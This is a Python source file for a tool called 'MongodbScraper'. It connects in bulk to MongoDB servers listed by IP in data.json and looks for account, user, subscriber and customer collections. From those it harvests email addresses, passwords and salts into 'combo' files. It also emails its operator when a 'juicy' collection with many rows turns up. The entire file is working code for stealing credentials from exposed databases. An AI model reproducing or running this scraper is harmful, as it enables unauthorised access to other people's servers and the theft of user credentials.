# coding=utf-8
import logging
import logging.handlers
import json
import re
from colorlog import ColoredFormatter
from pymongo import MongoClient
from pymongo import errors as mongo_errors
import io
import os
import smtplib
from email.mime.text import MIMEText


class MongodbScraper:
    def __init__(self):
        # Init class variables
        self.settings = {}
        self.ips = []
        self.processed = []
        self.table_names = ['account', 'user', 'subscriber', 'customer']
        self.column_names = ['pass', 'pwd']
        self.email_regex = re.compile(r'[a-z0-9\-\._]+@[a-z0-9\-\.]+\.[a-z]{2,4}')
        self.filename = 'combo.txt'

        # Init the logger
        self.logger = logging.getLogger('mongodb-scraper')
        self.logger.setLevel(logging.DEBUG)

        # Create a rotation logging, so we won't have and endless file
        rotate = logging.handlers.RotatingFileHandler(
                        'mongodb-scraper.log', maxBytes=(5 * 1024 * 1024), backupCount=3)
        rotate.setLevel(logging.DEBUG)
        formatter = logging.Formatter('%(asctime)s|%(levelname)-8s| %(message)s')
        rotate.setFormatter(formatter)

        self.logger.addHandler(rotate)

        console = logging.StreamHandler()
        console.setLevel(logging.INFO)

        formatter = ColoredFormatter("%(log_color)s[%(levelname)-4s] %(message)s%(reset)s")
        console.setFormatter(formatter)
        self.logger.addHandler(console)

        # Check that the data dir exists
        if not os.path.exists('data'):
            os.makedirs('data')

        # Load previous data
        self._load_data()

        # Load settings
        self._load_settings()

    def _load_data(self):
        self.logger.info("Opening data")

        try:
            with open('data.json', 'r') as data_json:
                self.ips = json.load(data_json)
        except (IOError, ValueError):
            raise RuntimeError("Please provide a valid JSON encoded file in data.json")

        self.logger.info("Found " + str(len(self.ips)) + " IPs to connect")

        try:
            with open('processed.json', 'r') as processed_json:
                self.processed = json.load(processed_json)
        except (IOError, ValueError):
            # Meh, I'll live with that...
            pass

        if self.processed:
            self.logger.info("Found " + str(len(self.processed)) + " already processed IP")

    def _load_settings(self):
        try:
            with open('settings.json', 'r') as settings_json:
                self.settings = json.load(settings_json)

            self.logger.info("Settings file found")
        except (IOError, ValueError):
            self.logger.info("Settings file not found")

    def _notify(self, ip, collection, count):
        try:
            threshold = self.settings['email']['threshold']
        except KeyError:
            # No key set
            return

        # Result is not interesting enough
        if count < threshold:
            return

        # Do I have all the required strings?
        try:
            email_from = self.settings['email']['from']
            email_to = self.settings['email']['to']
            host = self.settings['email']['smtp']['host']
            port = self.settings['email']['smtp']['port']
            user = self.settings['email']['smtp']['user']
            password = self.settings['email']['smtp']['password']
        except KeyError:
            return

        # Ok, but are they really set?
        if not all([email_from, email_to, host, port, user, password]):
            return

        # Ok, we're good to go
        body = """
Hi Dude!
I have just found a juicy collection!

IP: {0}
Collection: {1}
Rows: {2}
"""
        body = body.format(ip, collection, count)
        mailer = smtplib.SMTP(host, str(port), timeout=10)
        mailer.starttls()
        mailer.login(user=user, password=password)
        message = MIMEText(body)

        message['Subject'] = 'Juicy collection at ' + ip
        message['From'] = email_from
        message['To'] = email_to

        try:
            mailer.sendmail(email_from, [email_to], message.as_string())
            mailer.quit()
        except smtplib.SMTPException:
            return

    def _check_datafile(self):
        size = 0

        if os.path.exists('data/' + self.filename):
            size = os.path.getsize('data/' + self.filename)

        # Did the file grow too large?
        if size > (20 * 1024 * 1024):
            i = 0
            while i < 100:
                i += 1

                combo_file = 'combo_' + str(i) + '.txt'
                if not os.path.exists('data/' + combo_file):
                    self.filename = combo_file
                    break

    def scrape(self):
        for ip in self.ips:
            # Do I have already processed this IP?
            if ip in self.processed:
                continue

            self.logger.info("Connecting to " + ip)

            try:
                client = MongoClient(ip, connectTimeoutMS=5000)
                dbs = client.database_names()
            except (KeyboardInterrupt, SystemExit):
                return
            except:
                self.logger.warning("An error occurred while connecting to " + ip + ". Skipping")
                # Don't cry if we can't connect to the server
                self.processed.append(ip)
                continue

            for db in dbs:
                # Skip local system databases
                if db in ['admin', 'local']:
                    continue

                self.logger.debug("\t\tAnalyzing db: " + db)

                o_db = client[db]

                try:
                    collections = o_db.collection_names()
                except (KeyboardInterrupt, SystemExit):
                    return
                except Exception:
                    # Don't cry if something bad happens
                    self.logger.warning("\tAn error occurred while fetching collections from " + ip + ". Skipping.")
                    break

                for collection in collections:
                    if collection in ['system.indexes']:
                        continue

                    self.logger.debug("\t\tAnalyzing collection: " + collection)
                    # Is this a collection I'm interested into?
                    if not any(table in collection for table in self.table_names):
                        continue

                    o_coll = o_db[collection]

                    try:
                        row = o_coll.find_one()
                    except:
                        # Sometimes the collection is broken, let's skip it
                        continue

                    interesting = False

                    # If the collection is empty I get a null row
                    if row:
                        for key, value in row.iteritems():
                            # Is that a column we're interested into?
                            if any(column in key for column in self.column_names):
                                # Only consider plain strings, nothing fancy
                                if isinstance(value, basestring):
                                    interesting = True
                                    break

                    # This collection has no interesting data? Let's skip it
                    if not interesting:
                        continue

                    self.logger.info("** Table with interesting data found")

                    # Check if the current data file is too large
                    self._check_datafile()

                    # Ok there is interesting data inside it. Let's find if there is an email address, too
                    # I'll just check the first record and hope there is something similar to an email address.
                    email_field = ''
                    salt_field = ''

                    for key, value in row.iteritems():
                        # If we find anything that resemble an email address, let's store it
                        if isinstance(value, basestring):
                            if re.match(self.email_regex, value.encode('utf-8')):
                                email_field = key

                            if 'salt' in key.lower():
                                salt_field = key

                    rows = o_coll.find().max_time_ms(10000)
                    total = rows.count()

                    if total > 750:
                        self.logger.info("***FOUND COLLECTION WITH  " + str(total) + "  RECORDS. JUICY!!")

                    self._notify(ip, collection, total)

                    lines = []
                    counter = 0

                    try:
                        for row in rows:
                            counter += 1
                            try:
                                email = row[email_field]
                                if not email:
                                    email = ''
                            except:
                                email = ''

                            # Try to fetch the salt, if any
                            try:
                                salt = row[salt_field].encode('utf-8')
                                if not salt:
                                    salt = ''
                            except:
                                salt = ''

                            for key, value in row.iteritems():
                                try:
                                    # Is that a column we're interested into?
                                    if any(column in key for column in self.column_names):
                                        # Skip empty values
                                        if not value:
                                            continue

                                        # Skip fields that are not strings (ie reset_pass_date => datetime object)
                                        if not isinstance(value, basestring):
                                            continue

                                        value = value.encode('utf-8') + ':' + salt

                                        lines.append(unicode(ip.encode('utf-8') + '|' + email + ':' + value + '\n'))
                                except UnicodeDecodeError:
                                    # You know what? I'm done dealing with all those crazy encodings
                                    self.logger.warn("An error occurred while encoding the string. Skipping")
                                    continue

                            # If I get a very long list, let's write it in batches
                            if len(lines) >= 1000:
                                self.logger.info("\t\tWriting " + str(counter) + "/" + str(total) + " records")
                                with io.open('data/' + self.filename, 'a', encoding='utf-8') as fp_pass:
                                    fp_pass.writelines(lines)
                                    lines = []
                    except mongo_errors.ExecutionTimeout:
                        self.logger.warning("Cursor timed out, skipping")
                    except mongo_errors.BSONError:
                        self.logger.warning("Error while fetching cursor data, skipping")
                    except:
                        self.logger.warning("A generic error occurred while iterating over the cursors. Skipping")

                    with io.open('data/' + self.filename, 'a', encoding='utf-8') as fp_pass:
                        fp_pass.writelines(lines)

            client.close()
            self.processed.append(ip)

            with open('processed.json', 'w') as processed_json:
                json.dump(self.processed, processed_json)


if __name__ == '__main__':
    scraper = MongodbScraper()
    scraper.scrape()

